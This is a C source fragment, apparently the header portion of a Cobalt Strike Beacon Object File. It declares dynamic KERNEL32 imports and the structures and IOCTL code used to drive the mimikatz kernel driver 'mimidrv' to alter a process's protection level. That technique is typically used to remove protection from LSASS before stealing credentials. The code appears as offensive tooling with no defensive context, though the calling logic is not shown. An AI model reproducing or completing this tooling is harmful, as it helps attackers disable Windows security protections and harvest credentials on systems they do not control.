
#include <windows.h>
#include "beacon.h"
#include <winioctl.h>

#define MIMIKATZ_DRIVER L"mimidrv"

WINBASEAPI BOOL WINAPI KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
#define DeviceIoControl KERNEL32$DeviceIoControl

WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
#define GetLastError KERNEL32$GetLastError

WINBASEAPI HLOCAL WINAPI KERNEL32$LocalAlloc(UINT uFlags, SIZE_T uBytes);
#define LocalAlloc KERNEL32$LocalAlloc 

WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);
#define LocalFree KERNEL32$LocalFree

WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
#define CreateFileW KERNEL32$CreateFileW

WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
#define CloseHandle KERNEL32$CloseHandle

typedef struct _PS_PROTECTION {
	UCHAR Type	: 3;
	UCHAR Audit	: 1;
	UCHAR Signer: 4;
} PS_PROTECTION, *PPS_PROTECTION;

typedef struct _KIWI_PROCESS_SIGNATURE_PROTECTION {
	UCHAR SignatureLevel;
	UCHAR SectionSignatureLevel;
	PS_PROTECTION Protection;
} KIWI_PROCESS_SIGNATURE_PROTECTION, *PKIWI_PROCESS_SIGNATURE_PROTECTION;

typedef struct _MIMIDRV_PROCESS_PROTECT_INFORMATION {
	ULONG processId;
	KIWI_PROCESS_SIGNATURE_PROTECTION SignatureProtection;
} MIMIDRV_PROCESS_PROTECT_INFORMATION, *PMIMIDRV_PROCESS_PROTECT_INFORMATION;

#define IOCTL_MIMIDRV_PROCESS_PROTECT		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x012, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
